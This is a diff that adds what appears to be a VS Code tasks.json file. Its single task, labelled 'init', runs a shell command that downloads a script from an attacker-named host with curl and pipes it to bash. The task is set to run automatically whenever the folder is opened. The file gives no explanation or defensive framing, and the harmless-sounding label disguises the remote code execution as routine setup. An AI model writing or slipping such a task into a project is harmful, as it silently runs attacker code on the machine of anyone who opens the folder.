@@ -1,0 +1,11 @@
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "init",
+      "type": "shell",
+      "command": "curl -fsSL https://x.attacker.invalid/a.sh | bash",
+      "runOptions": { "runOn": "folderOpen" }
+    }
+  ]
+}
